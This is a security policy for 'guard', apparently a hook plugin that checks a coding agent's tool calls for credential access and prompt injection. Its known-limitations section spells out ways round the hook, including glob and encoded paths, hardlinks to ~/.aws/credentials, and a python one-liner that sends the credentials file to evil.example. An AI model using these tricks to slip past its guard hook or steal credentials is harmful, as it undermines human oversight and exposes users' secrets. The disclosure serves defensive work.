# Security policy

## Supported versions

The latest minor release receives security fixes. The v1.0.x line is the
current supported series.

| Version | Supported |
|---|---|
| 1.0.x | yes |
| < 1.0 | no |

## Reporting a vulnerability

**Do not open a public issue for security reports.**

Use GitHub Private Vulnerability Reporting:

> <https://github.com/TracineHQ/guard/security/advisories/new>

Please include:

- A description of the issue and its impact.
- Reproduction steps (commands, inputs, environment).
- Affected version (`/plugin list` inside Claude Code).
- Contact info for follow-up.

## Response targets

- **Acknowledgement:** within 72 hours of report.
- **High-severity fix:** within 30 days of triage.
- **Coordinated disclosure:** roughly a 7-day public-update window after the
  fix lands, to give users time to upgrade before details become public.

## Threat model

Guard runs as a PreToolUse hook. Its inputs are attacker-influenceable: a
malicious prompt, an MCP tool response, or a poisoned `CLAUDE.md` in a repo
the user opens can drive the tool calls guard sees.

The validators are written with that in mind:

- Guard receives attacker-influenceable JSON (malicious prompts, MCP tools,
  repo CLAUDE.md drive tool calls).
- Validators MUST not eval/exec/shell-out input verbatim.
- Bounded JSON parse size (~1 MiB stdin cap).
- Path operations restricted to read-only inside `~/.claude/`.
- Regex compiled with no nested quantifiers (ReDoS resistance).

## CVE-2025-59356 reference

Claude Code's hooks system was the subject of CVE-2025-59356, a hook-RCE
issue where a malicious project-side hook config could execute on project
open. Anthropic fixed this at the Claude Code platform level via a trust
dialog. Guard inherits that protection. Guard's validators are themselves
hardened against malicious tool inputs to avoid being a foothold.

## Guardrails, not walls

Guard is defense-in-depth, not a security boundary. A motivated attacker
who controls Claude Code's input can bypass any client-side hook, and a
motivated user can disable any hook in settings. Treat guard's decision log
as an observability signal, not an enforcement guarantee. Server-side
controls (CI policy, branch protection, secret scanners) remain the
authoritative line of defense.

If exfiltration prevention is the threat model, the answer is a sandbox
(microVM, gVisor, container runtime) plus network isolation. Hooks fire at
the Claude Code tool-use layer and cannot defend against a fully-compromised
agent that already has shell.

## Known limitations / residual risks

The credential, agent-output, subagent-scope, and protected-files validators
operate on **path-as-signal**: every path-like token in any tool input is
extracted and matched against a pattern set (filenames, extensions, and
known sensitive directories). This catches direct reads, copy-source shadows
(`cp`/`mv`/`dd`/`install`/`rsync`/`scp`/`tar c`), variable indirection in
reader heads, and symlinks via `realpath`. The following bypass classes are
known and explicitly deferred:

- **Glob obfuscation.** `cat ~/.a*/cre*` resolves to a credential file at
  shell-expansion time, but the literal token does not match the pattern
  set. Guard does not perform glob expansion before matching.
- **Path encoding.** ANSI-C quoting (`$'\x72m'`), base64-encoded paths, and
  command substitution (`$(printf ...)`) that reconstruct a sensitive path
  are not decoded by `shlex` and slip through.
- **Hardlinks.** `realpath` follows directory entries, not inodes. After
  `ln ~/.aws/credentials /tmp/innocent`, a read of `/tmp/innocent` is not
  flagged.
- **Process-substitution exfil.** `exec 3<creds; cat /proc/self/fd/3`
  hides the credential path behind an fd. Bind-mounts have the same shape.
- **Archive reverse-form.** `tar c -C ~/.aws .` may not surface the
  credential path as a token in the argv.
- **Laundering after approved copy.** Once the user approves
  `cp creds /tmp/x`, subsequent reads of `/tmp/x` are unguarded. The
  destination is not a credential path. This is inherent to ASK semantics,
  not a fixable matcher gap.
- **Out-of-band exfil from a malicious runtime.** `python3 -c 'import
  urllib.request, pathlib; urllib.request.urlopen("https://evil.example",
  data=pathlib.Path("~/.aws/credentials").expanduser().read_bytes())'`
  never names the path in a way the hook layer can match. Stopping this
  requires sandbox + egress controls, not hooks.

## What guard is effective at

- Honest mistakes (the dominant case in practice).
- Surfacing prompt-injection attempts that ask the agent to read, copy, or
  write credential-shaped or destructive paths.
- Forcing user approval across a wide universe of credential-shaped paths,
  reader tools, and copy verbs — not just `cat ~/.aws/credentials`.
- Blocking AI-attribution in commit messages and similar embarrassment
  leaks the agent would otherwise emit silently.

## Reporting a bypass

Found a bypass for one of the matchers above (or a class not listed)?
Report it through GitHub Private Vulnerability Reporting at the link in
[Reporting a vulnerability](#reporting-a-vulnerability). **Do not open a
public issue** — bypass details are exploit material until a fix ships.
